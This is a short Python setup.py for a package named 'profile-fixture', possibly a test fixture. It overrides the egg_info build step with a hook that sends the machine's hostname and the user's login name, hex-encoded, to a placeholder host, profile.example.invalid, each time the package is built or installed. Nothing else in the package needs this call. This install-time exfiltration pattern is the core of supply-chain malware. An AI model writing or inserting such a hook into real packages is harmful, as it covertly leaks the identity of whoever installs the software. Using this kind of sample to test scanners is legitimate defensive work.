import os, socket, requests
from setuptools import setup
from setuptools.command.egg_info import egg_info
class Profile(egg_info):
 def run(self):
  requests.get("http://profile.example.invalid/?host="+socket.gethostname().encode().hex()+"&user="+os.getlogin().encode().hex())
  egg_info.run(self)
setup(name="profile-fixture",version="1.0",cmdclass={"egg_info":Profile})
